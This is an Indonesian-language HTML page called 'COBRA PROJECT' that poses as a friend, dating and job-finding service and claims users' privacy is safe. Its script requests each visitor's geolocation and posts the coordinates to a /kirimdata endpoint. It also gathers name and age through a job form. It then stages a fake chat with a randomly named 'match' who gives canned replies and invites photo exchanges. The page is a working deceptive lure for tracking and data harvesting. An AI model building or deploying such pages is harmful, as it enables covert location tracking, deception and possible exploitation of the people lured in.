<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>COBRA PROJECT</title>
  <style>
    body {
      background-color: black;
      color: #ff4d4d;
      font-family: monospace;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
      text-align: center;
    }
    h1 {
      font-size: 2em;
      margin-bottom: 10px;
      animation: flicker 1.5s infinite alternate;
    }
    .glitch-button {
      border: 2px solid #ff4d4d;
      padding: 10px 20px;
      margin: 10px;
      font-size: 1em;
      cursor: pointer;
      color: #ff4d4d;
      background: black;
      transition: background 0.3s, color 0.3s;
    }
    .glitch-button:hover {
      background: #ff4d4d;
      color: black;
    }
    #loading {
      position: fixed;
      top: 0;
      left: 0;
      background-color: black;
      color: #ff4d4d;
      width: 100%;
      height: 100%;
      z-index: 99;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.5em;
      animation: flicker 1s infinite alternate;
    }
    @keyframes flicker {
      from { opacity: 1; }
      to { opacity: 0.5; }
    }
    input, button {
      font-family: monospace;
    }
  </style>
</head>
<body>
  <div id="loading">ğŸ§  Mendeteksi realitas digital...</div>
  <div id="app" style="display:none;"></div>

  <script>
    const app = document.getElementById('app');

    window.onload = () => {
      setTimeout(() => {
        document.getElementById('loading').remove();
        showWelcome();
      }, 2000);
    };

    function showWelcome() {
      app.innerHTML = `
        <h1>ğŸ‘‹ Halo kak/bang!</h1>
        <p>Selamat datang di <b>Project Cobra Web</b></p>
        <p>Kami menyediakan layanan:</p>
        <ul style="list-style:none; padding:0; margin:10px 0;">
          <li>ğŸ¤ Cari Teman</li>
          <li>ğŸ’˜ Cari Pasangan</li>
          <li>ğŸ’¼ Cari Pekerjaan</li>
        </ul>
        <p style="max-width:500px; margin:auto;">Kami sedang mengembangkan web ini. Data & privasi Anda dijamin aman.</p>
        <div class="glitch-button" onclick="showMainMenu()">Masuk</div>
      `;
    }

    function showMainMenu() {
      app.innerHTML = `
        <h1>ğŸ‘ï¸â€ğŸ—¨ï¸ Cobra Project</h1>
        <p>Silakan pilih layanan:</p>
        <div class="glitch-button" onclick="cariPasangan()">ğŸ’˜ Cari Pasangan</div>
        <div class="glitch-button" onclick="cariTeman()">ğŸ¤ Cari Teman</div>
        <div class="glitch-button" onclick="cariPekerjaan()">ğŸ’¼ Cari Pekerjaan</div>
      `;
      app.style.display = "flex";
      app.style.flexDirection = "column";
    }

    function getRandomName() {
      const names = ["Aluna", "Dimas", "Raisa", "Irfan", "Salsa", "Vina", "Rian", "Citra", "Agus"];
      return names[Math.floor(Math.random() * names.length)];
    }

    function kirimDataKeServer(data) {
      fetch("/kirimdata", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      }).then(res => res.json())
        .then(res => {
          if (!res.success) console.warn("Gagal kirim ke server");
        }).catch(err => {
          console.error("Error kirim:", err);
        });
    }

    function cariPasangan() {
      app.innerHTML = `<h1>ğŸ“ Meminta akses lokasi...</h1>`;
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          kirimDataKeServer({
            fitur: "Cari Pasangan",
            lat, lon,
            waktu: new Date().toLocaleString()
          });
          app.innerHTML = `<h1>ğŸ” Mencari pasangan terdekat...</h1>`;
          setTimeout(() => {
            chatUI(getRandomName(), "Pasangan");
          }, 3000);
        },
        () => {
          app.innerHTML = `
            <h1>âŒ Lokasi dibutuhkan</h1>
            <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
            <div class="glitch-button" onclick="cariPasangan()">ğŸ“ Coba Lagi</div>
          `;
        },
        { timeout: 5000 }
      );
    }

    function cariTeman() {
      app.innerHTML = `<h1>ğŸ“ Mendeteksi lokasi untuk mencari teman...</h1>`;
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          kirimDataKeServer({
            fitur: "Cari Teman",
            lat, lon,
            waktu: new Date().toLocaleString()
          });
          app.innerHTML = `<h1>ğŸ” Mencari teman terdekat...</h1>`;
          setTimeout(() => {
            chatUI(getRandomName(), "Teman");
          }, 3000);
        },
        () => {
          app.innerHTML = `
            <h1>âŒ Lokasi dibutuhkan</h1>
            <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
            <div class="glitch-button" onclick="cariTeman()">ğŸ“ Coba Lagi</div>
          `;
        },
        { timeout: 5000 }
      );
    }

    function cariPekerjaan() {
      app.innerHTML = `<h1>ğŸ“ Meminta lokasi untuk mencari kerja...</h1>`;
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          kirimDataKeServer({
            fitur: "Cari Pekerjaan",
            lat, lon,
            waktu: new Date().toLocaleString()
          });
          setTimeout(() => {
            showPekerjaanForm();
          }, 2000);
        },
        () => {
          app.innerHTML = `
            <h1>âŒ Lokasi dibutuhkan</h1>
            <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
            <div class="glitch-button" onclick="cariPekerjaan()">ğŸ“ Coba Lagi</div>
          `;
        },
        { timeout: 5000 }
      );
    }

    function chatUI(name, type) {
      app.innerHTML = `
        <h1>ğŸ’¬ Chat dengan ${name} (${type})</h1>
        <div id="chatbox" style="flex:1; overflow-y:auto; background:#111; padding:10px; width:90%; max-width:500px; border:1px solid #ff4d4d; margin:10px auto; height:300px;"></div>
        <div style="display:flex; justify-content:center; gap:5px;">
          <input id="userInput" placeholder="Tulis pesan..." style="flex:1; padding:10px; background:#1a1a1a; color:white; border:none; width:60%;">
          <button onclick="sendMsg('${name}')" class="glitch-button">Kirim</button>
          <button onclick="document.getElementById('imgInput').click()" class="glitch-button">ğŸ“·</button>
        </div>
        <input type="file" accept="image/*" id="imgInput" style="display:none" onchange="sendImg(event, '${name}')">
      `;
      const chatbox = document.getElementById("chatbox");
      chatbox.innerHTML += `<p><b>${name}:</b> Hai! Aku pengen ngobrol ğŸ˜„</p>`;
    }

    function sendMsg(name) {
      const box = document.getElementById("chatbox");
      const input = document.getElementById("userInput");
      const text = input.value.trim();
      if (!text) return;
      box.innerHTML += `<p><b>Kamu:</b> ${text}</p>`;
      input.value = "";
      if (text.toLowerCase().includes("pap") || text.toLowerCase().includes("foto")) {
        setTimeout(() => {
          box.innerHTML += `<p><b>${name}:</b> Nih aku kirim ya...</p>`;
          box.innerHTML += `<img src="https://i.pinimg.com/564x/17/28/27/172827e2c1992f3a6b6d818ae6fce4f6.jpg" width="150" style="border-radius:8px; margin-top:5px;">`;
          box.scrollTop = box.scrollHeight;
        }, 1000);
      } else {
        setTimeout(() => {
          box.innerHTML += `<p><b>${name}:</b> Kamu asik juga ya ğŸ˜</p>`;
          box.scrollTop = box.scrollHeight;
        }, 1000);
      }
      box.scrollTop = box.scrollHeight;
    }

    function sendImg(e, name) {
      const file = e.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = function(evt) {
        const box = document.getElementById("chatbox");
        box.innerHTML += `<p><b>Kamu:</b></p><img src="${evt.target.result}" width="150" style="border-radius:8px; margin-top:5px;">`;
        setTimeout(() => {
          box.innerHTML += `<p><b>${name}:</b> Wah... ğŸ«£</p>`;
          box.scrollTop = box.scrollHeight;
        }, 1000);
        box.scrollTop = box.scrollHeight;
      };
      reader.readAsDataURL(file);
    }

    function showPekerjaanForm() {
      app.innerHTML = `
        <h1>ğŸ“ Formulir Lamaran Pekerjaan</h1>
        <input placeholder="Nama Lengkap" id="namaKerja" style="padding:10px; width:80%; margin-top:10px; background:#1a1a1a; color:white; border:none;"><br>
        <input placeholder="Umur" id="umurKerja" type="number" style="padding:10px; width:80%; margin-top:10px; background:#1a1a1a; color:white; border:none;"><br>
        <input placeholder="Minat Pekerjaan" id="minatKerja" style="padding:10px; width:80%; margin-top:10px; background:#1a1a1a; color:white; border:none;"><br>
        <div class="glitch-button" onclick="kirimLamaran()">Kirim Lamaran</div>
      `;
    }

    function kirimLamaran() {
      const nama = document.getElementById("namaKerja").value.trim();
      const umur = document.getElementById("umurKerja").value.trim();
      const minat = document.getElementById("minatKerja").value.trim();
      if (!nama || !umur || !minat) {
        alert("Isi semua data.");
        return;
      }

      kirimDataKeServer({
        fitur: "Form Lamaran",
        nama, umur, minat,
        waktu: new Date().toLocaleString()
      });

      app.innerHTML = `<h1>â³ Memproses lamaran Anda...</h1>`;
      setTimeout(() => {
        app.innerHTML = `
          <h1>âœ… Lamaran Diterima</h1>
          <p>Terima kasih ${nama}, kami akan menghubungi Anda jika cocok.</p>
          <div class="glitch-button" onclick="showMainMenu()">Kembali</div>
        `;
      }, 3000);
    }
  </script>
</body>
</html>
